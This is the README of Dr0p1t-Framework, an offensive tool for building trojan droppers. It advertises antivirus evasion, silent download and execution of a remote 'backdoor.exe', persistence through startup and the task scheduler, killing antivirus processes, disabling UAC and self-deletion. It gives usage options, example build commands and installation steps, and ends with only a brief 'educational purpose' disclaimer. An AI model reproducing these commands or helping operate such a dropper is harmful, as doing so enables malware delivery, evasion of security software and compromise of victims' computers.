# Dr0p1t-Framework ![Stage](https://img.shields.io/badge/Release-STABLE-brightgreen.svg) [![Python 3.5](https://img.shields.io/badge/Python-3.5-yellow.svg)](http://www.python.org/download/) [![Python 2.7](https://img.shields.io/badge/Python-2.7-yellow.svg)](http://www.python.org/download/) ![Build Status](https://img.shields.io/badge/Version-1.2-red.svg)
###### *** Version 1.2 , see CHANGELOG.md file ***

Have you ever heard about trojan droppers ?

In short dropper is type of trojans that downloads other malwares and Dr0p1t gives you the chance to create a dropper that bypass most AVs and have some tricks ;)

# Features
- Framework works with Windows and Linux
- Download executable on target system and execute it silently..
- The executable size small compared to other droppers generated the same way
- Self destruct function so that the dropper will kill and delete itself after finishing it work
- Adding executable after downloading it to startup
- Adding executable after downloading it to task scheduler ( UAC not matters )
- Finding and killing the antivirus before running the malware
- Running a custom ( batch|powershell|vbs ) file you have chosen before running the executable
- The ability to disable UAC
- In running powershell scripts it can bypass execution policy
- Using UPX to compress the dropper after creating it
- Choose an icon for the dropper after creating it

# Screenshots ( Not updated )
## On Windows
<img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Windows/Random2.JPG" width="55%"></img>

<img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Windows/Random1.JPG" width="40%"></img>
<img src="https://github.com/D4Vinci/Dr0p1t-Framework/raw/master/Screenshots/Windows/Help_msg.JPG" width="35%"></img>
## On Linux (Backbox)
<img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Linux/Random1.JPG" width="55%"></img>

<img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Linux/Random2.JPG" width="40%"></img>
<img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Linux/Help_msg.JPG" width="35%"></img>

### Help menu
```
Usage: Dr0p1t.py Malware_Url [Options]

options:
  -h, --help   show this help message and exit
  -s           Add your malware to startup (Persistence)
  -t           Add your malware to task scheduler (Persistence)
  -k           Kill antivirus process before running your malware.
  -b           Run this batch script before running your malware. Check scripts folder
  -p           Run this powershell script before running your malware. Check scripts folder
  -v           Run this vbs script before running your malware. Check scripts folder
  --only32     Download your malware for 32 bit devices only
  --only64     Download your malware for 64 bit devices only
  --upx        Use UPX to compress the final file.
  --nouac      Disable UAC on victim device
  --nocompile  Tell the framework to not compile the final file.
  -i           Use icon to the final file. Check icons folder.
  -q           Stay quite ( no banner )
  -u           Check for updates
  -nd          Display less output information
```
### Examples
```
./Dr0p1t.py https://test.com/backdoor.exe -s -t -k --upx
./Dr0p1t.py https://test.com/backdoor.exe -k -b block_online_scan.bat --only32
./Dr0p1t.py https://test.com/backdoor.exe -s -t -k -p Enable_PSRemoting.ps1
./Dr0p1t.py https://test.com/backdoor.exe -s -t -k --nouac -i flash.ico
```
# Prerequisites
- Python 2 or Python 3.

>The recommended version for Python 2 is 2.7.x , the recommended version for Python 3 is 3.5.x and don't use 3.6 because it's not supported yet by PyInstaller

- Python libraries requirements in requirements.txt

### Needed dependencies for linux
- Wine
- Python 2.7 on Wine Machine

>Note : You must have root access

# Installation
if you are on linux and do
```
git clone https://github.com/D4Vinci/Dr0p1t-Framework
chmod 777 -R Dr0p1t-Framework
cd Dr0p1t-Framework
pip install -r requirements.txt
./Dr0p1t.py
```
And if you are on windows download it and then do
```
cd Dr0p1t-Framework
pip install -r requirements.txt
pip install -r windows_requirements.txt
./Dr0p1t.py
```
Libraries in windows_requirements.txt are used to enable unicodes in windows which will make coloring possible :smile:

### Tested on:

- Kali Linux - SANA
- Ubuntu 14.04-16.04 LTS
- Windows 10/8.1/8

## Todo [Check out this link](https://github.com/D4Vinci/Dr0p1t-Framework/projects/1)

## Contact
- [Twitter](https://twitter.com/D4Vinci1)
- [Facebook](https://www.facebook.com/kareem.shoair)

## Disclaimer
Dr0p1t Framework not responsible for misuse and for illegal purposes. Use it only for work or educational purpose !!!

Copying a code from this framework or using it in another tool is accepted as you mention where you get it from :smile:

> Pull requests are always welcomed :D

# Much more features to come, stay tuned !!
